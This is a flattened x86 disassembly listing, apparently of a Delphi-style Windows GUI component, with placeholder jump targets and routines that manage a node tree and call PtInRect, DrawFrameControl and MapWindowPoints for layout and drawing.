mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_45ed4c
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_45eef4
jmp r-xdata
sub_45ed4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e1a0
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_45e6ec
mov edx eax
mov eax ebx
call sub_45e714
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_45e714
mov eax [ esi + 0x64 ]
call sub_45e6ec
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_45fdbc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_45eaa0
mov eax [ esi + 0x64 ]
call sub_45e6ec
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_45fdbc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_45eaa0
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_460140
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_45eaa0
mov eax [ esi + 0x64 ]
call sub_45e6ec
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_460274
xor edx edx
mov eax esi
call sub_45eaa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_45e714
adc edx 0x0
mov eax ebx
call sub_45e3d4
mov eax ebx
call sub_45e764
push esi
push sub_460274
xor edx edx
mov eax esi
call sub_45eaa0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_45eef4
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_45e3d4
mov eax [ ebx + 0x14 ]
call sub_45e764
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_45ef6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_45e6ec
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_45e6ec
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_45e6ec
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_45e2b8
mov esi eax
mov edx 0x2
mov eax ebx
call sub_45e2b8
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_45e6ec
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_45e7c4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_45e7ec
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45e7c4
call sub_45ef6c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45e7ec
call sub_45ef6c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_45e324
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_45e324
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_45f198
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_459078
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_45903c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_417744
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f22c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_45f198
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_45e7ec
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_45ea38
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_45e7ec
call sub_45ef6c
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_45f2b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403f7c
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4045c8
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_45f2fc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45f4f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_45f9cc
mov eax [ ebp - 0x8 ]
call sub_45e9c8
xor edx edx
push ebp
push sub_45f4d7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f4de
mov eax [ ebp - 0x8 ]
call sub_45e9cc
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e1a0
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_45f2b4
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_4033e8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_45e4c0
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_45f2b4
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_45596c
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_45674c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4031ec
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_45f504
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_41776c
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_425738
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f55c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_424c94
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_4253b4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_425354
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_425354
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_424c94
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_425354
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_425354
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45f5e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_45f504
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_45f55c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_45f55c
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_45f504
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_45f55c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_45f55c
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_45f6c0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45f816
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_454628
mov eax [ ebp - 0x4 ]
call sub_42538c
xor eax eax
push ebp
push sub_45f7f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4257b8
xor eax eax
push ebp
push sub_45f7dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_459078
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f7e3
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4257b8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_45903c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4553ec
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_45f824
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_45ae78
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_455494
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_455450
mov ecx eax
xor edx edx
xor eax eax
call sub_41776c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_45c380
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417794
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_45f998
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45f998
pop ecx
mov eax ebx
call sub_4031ec
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45f998
pop ecx
sub_45f9cc
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_45f998
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4031ec
xor eax eax
mov [ esi + 0x64 ] eax
sub_45fa28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45ea38
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_45fa64
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45fa64
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45fcd1
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d64
mov edx [ ebp - 0x8 ]
pop eax
call sub_404244
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
mov eax [ ebx + 0x14 ]
call sub_45e1c4
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov edx [ ebp - 0x10 ]
pop eax
call sub_404244
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4031ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fcd8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fa0
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_45e574
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_45e6ec
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_45e728
mov eax [ ebx + 0x18 ]
call sub_45e574
